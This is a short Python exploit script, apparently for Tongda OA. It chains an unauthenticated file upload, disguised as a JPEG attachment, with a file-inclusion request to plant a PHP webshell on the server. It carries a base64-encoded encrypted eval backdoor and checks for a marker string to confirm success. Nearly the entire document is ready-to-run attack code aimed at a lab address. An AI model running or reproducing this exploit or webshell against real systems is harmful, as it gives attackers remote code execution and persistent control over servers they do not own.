# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20200317
import requests

upload_url = "http://192.168.1.109:8085/ispirit/im/upload.php"
include_url = "http://192.168.1.109:8085/ispirit/interface/gateway.php"

shell_name = 'shell.php'
shell_dir = "/"
path = shell_dir + shell_name
header = {
    "Content-Type": "multipart/form-data; boundary=abcd",
}
check_flag = "23333:)"
b64_shell_content = "PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+"
data1 = "--abcd\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n--abcd\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n--abcd\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n--abcd\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents(\"../" + path + "\", base64_decode('" + b64_shell_content + "'));\r\necho \"" + check_flag + "\";\r\n?>\r\n--abcd--"
req1 = requests.post("http://192.168.1.109:8085" + "/ispirit/im/upload.php", headers=header, verify=False, data=data1,
                     timeout=10)
print(req1.text)
path = req1.text
path = path[path.find('@') + 1:path.rfind('|')].replace("_", "/").replace("|", ".")
print(path)
include_data = {
    "json": "{\"url\":\"/general/../../attach/im/" + path + "\"}"}  # 文件包含可在指定目录生成一个shell, eg(http://192.168.1.109:8085/ispirit/shell.php)
include_res = requests.post(include_url, data=include_data)
print(include_res.text)
if '23333:)' in include_res.text:
    print('success')
